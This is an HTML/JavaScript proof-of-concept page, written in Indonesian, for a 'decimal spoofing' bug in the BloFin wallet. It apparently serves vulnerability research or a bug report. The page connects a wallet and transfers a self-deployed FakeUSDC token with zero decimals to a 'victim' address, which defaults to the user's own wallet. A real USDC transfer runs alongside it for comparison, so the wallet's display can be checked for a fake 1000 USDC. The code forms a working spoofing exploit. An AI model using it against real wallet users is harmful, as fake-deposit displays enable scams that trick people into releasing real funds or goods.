<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>BLOFIN – DECIMAL SPOOFING PoC</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
    body { background: #0a0a0a; color: #e5e5e5; padding: 16px; max-width: 480px; margin: 0 auto; min-height: 100vh; }
    h1 { color: #ff9500; font-size: 1.35rem; margin-bottom: 14px; line-height: 1.3; font-weight: 700; }
    .card { background: #1c1c1e; border-radius: 14px; padding: 14px 16px; margin-bottom: 12px; font-size: 0.9rem; line-height: 1.45; color: #d1d1d6; }
    .btn { display: block; width: 100%; border: none; border-radius: 14px; padding: 16px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-bottom: 12px; text-align: center; -webkit-tap-highlight-color: transparent; }
    .btn-blue { background: #0a84ff; color: #fff; }
    .btn-orange { background: #ff9f0a; color: #000; }
    .btn-green { background: #30d158; color: #000; }
    .btn-purple { background: #bf5af2; color: #fff; }
    .btn:disabled { opacity: 0.45; cursor: not-allowed; }
    .btn:active { opacity: 0.85; }
    input { width: 100%; background: #2c2c2e; border: 1px solid #3a3a3c; border-radius: 12px; padding: 14px; color: #fff; font-size: 0.92rem; margin-bottom: 10px; outline: none; }
    input::placeholder { color: #8e8e93; }
    .label { font-size: 0.78rem; color: #8e8e93; margin-bottom: 6px; font-weight: 500; }
    #logs { background: #111; border-radius: 12px; padding: 12px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 0.78rem; color: #30d158; max-height: 200px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
    .status { font-size: 0.85rem; word-break: break-all; }
  </style>
</head>
<body>
  <h1>BLOFIN – DECIMAL SPOOFING<br>PoC</h1>

  <div class="card">
    Bug: Symbol <b>USDC</b> dibaca, tapi <b>decimals()</b> tidak dicek.<br>
    Work di BNB Smart Chain / Base / Ethereum.
  </div>

  <button class="btn btn-blue" id="btnConnect">1. CONNECT WALLET</button>

  <div class="card" id="statusBox" style="display:none;">
    <div class="status" id="connectedInfo"></div>
  </div>

  <div class="label">FakeUSDC Address (paste sekali dari Remix)</div>
  <input type="text" id="fakeUsdcInput" placeholder="0x... (akan tersimpan otomatis)" />

  <button class="btn btn-purple" id="btnSaveFake" disabled>Simpan FakeUSDC</button>

  <div class="label">Victim Address (otomatis = wallet kamu)</div>
  <input type="text" id="victimInput" placeholder="Otomatis terisi setelah connect" />

  <button class="btn btn-orange" id="btnTransferFake" disabled>
    2. TRANSFER 1000 FakeUSDC (decimals 0)
  </button>

  <button class="btn btn-green" id="btnTransferReal" disabled>
    3. TRANSFER 1000 USDC Asli (perbandingan)
  </button>

  <div class="card">
    <div class="label">Logs</div>
    <div id="logs">Menunggu connect...</div>
  </div>

  <script>
    // Real USDC
    const REAL_USDC = {
      1:    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // Ethereum
      56:   "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // BSC
      8453: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"  // Base
    };

    let provider, signer, userAddress;

    function log(msg) {
      const el = document.getElementById("logs");
      const time = new Date().toLocaleTimeString("id-ID", { hour12: false });
      el.innerHTML += `[${time}] ${msg}\n`;
      el.scrollTop = el.scrollHeight;
    }

    // Auto load FakeUSDC dari localStorage
    function loadSavedFake() {
      if (!provider) return;
      provider.getNetwork().then(net => {
        const saved = localStorage.getItem("fakeUsdc_" + net.chainId);
        if (saved) {
          document.getElementById("fakeUsdcInput").value = saved;
          log("FakeUSDC loaded dari storage");
        }
      });
    }

    // CONNECT
    document.getElementById("btnConnect").onclick = async () => {
      try {
        if (!window.ethereum) {
          alert("Buka halaman ini di dalam dApp Browser BloFin Wallet");
          return;
        }

        provider = new ethers.providers.Web3Provider(window.ethereum, "any");
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();
        const network = await provider.getNetwork();
        const chainId = Number(network.chainId);

        const chainName = {
          1: "Ethereum",
          56: "BNB Smart Chain",
          8453: "Base"
        }[chainId] || "Unknown";

        document.getElementById("statusBox").style.display = "block";
        document.getElementById("connectedInfo").innerHTML = `
          <b>Connected</b><br>
          ${userAddress}<br><br>
          ChainID: ${chainId} – ${chainName}
          ${![1, 56, 8453].includes(chainId) ? "<br><br><span style='color:#ff453a'>⚠️ Pindah ke BSC / Base / Ethereum di BloFin</span>" : ""}
        `;

        // Victim otomatis = wallet sendiri
        document.getElementById("victimInput").value = userAddress;

        // Enable buttons
        document.getElementById("btnSaveFake").disabled = false;
        document.getElementById("btnTransferFake").disabled = false;
        document.getElementById("btnTransferReal").disabled = false;

        log(`Connected ${userAddress.slice(0,6)}...${userAddress.slice(-4)} | Chain ${chainId}`);
        loadSavedFake();
      } catch (e) {
        log("Connect error: " + (e.message || e));
      }
    };

    // Simpan FakeUSDC
    document.getElementById("btnSaveFake").onclick = async () => {
      const addr = document.getElementById("fakeUsdcInput").value.trim();
      if (!ethers.utils.isAddress(addr)) {
        alert("Alamat FakeUSDC tidak valid");
        return;
      }
      const network = await provider.getNetwork();
      localStorage.setItem("fakeUsdc_" + network.chainId, addr);
      log("FakeUSDC disimpan untuk chain " + network.chainId);
      alert("FakeUSDC berhasil disimpan!");
    };

    // TRANSFER FAKE USDC
    document.getElementById("btnTransferFake").onclick = async () => {
      try {
        const tokenAddr = document.getElementById("fakeUsdcInput").value.trim();
        const victim = document.getElementById("victimInput").value.trim() || userAddress;

        if (!ethers.utils.isAddress(tokenAddr)) {
          alert("Isi alamat FakeUSDC dulu (deploy di Remix)");
          return;
        }

        const token = new ethers.Contract(tokenAddr, [
          "function transfer(address to, uint256 amount) returns (bool)",
          "function balanceOf(address) view returns (uint256)",
          "function decimals() view returns (uint8)",
          "function symbol() view returns (string)"
        ], signer);

        const [decimals, symbol, bal] = await Promise.all([
          token.decimals(),
          token.symbol(),
          token.balanceOf(userAddress)
        ]);

        log(`Token: ${symbol} | decimals: ${decimals} | balance: ${bal.toString()}`);

        // Karena decimals = 0 → kirim angka 1000 langsung
        const amount = 1000;
        const tx = await token.transfer(victim, amount);
        log("TX FakeUSDC: " + tx.hash);
        await tx.wait();
        log("✅ Transfer 1000 FakeUSDC sukses! Cek popup BloFin");
      } catch (e) {
        log("Error Fake: " + (e.reason || e.message || e));
      }
    };

    // TRANSFER REAL USDC
    document.getElementById("btnTransferReal").onclick = async () => {
      try {
        const network = await provider.getNetwork();
        const chainId = Number(network.chainId);
        const usdcAddr = REAL_USDC[chainId];

        if (!usdcAddr) {
          alert("Chain tidak didukung. Pakai BSC / Base / Ethereum");
          return;
        }

        const victim = document.getElementById("victimInput").value.trim() || userAddress;
        const usdc = new ethers.Contract(usdcAddr, [
          "function transfer(address to, uint256 amount) returns (bool)",
          "function decimals() view returns (uint8)",
          "function balanceOf(address) view returns (uint256)"
        ], signer);

        const decimals = await usdc.decimals();
        const amount = ethers.utils.parseUnits("1000", decimals);

        const tx = await usdc.transfer(victim, amount);
        log("TX Real USDC: " + tx.hash);
        await tx.wait();
        log("✅ Transfer 1000 USDC asli sukses");
      } catch (e) {
        log("Error Real: " + (e.reason || e.message || e));
      }
    };

    // Auto-connect kalau sudah pernah connect
    window.addEventListener("load", async () => {
      if (window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: "eth_accounts" });
          if (accounts.length > 0) {
            document.getElementById("btnConnect").click();
          }
        } catch {}
      }
    });
  </script>
</body>
</html>
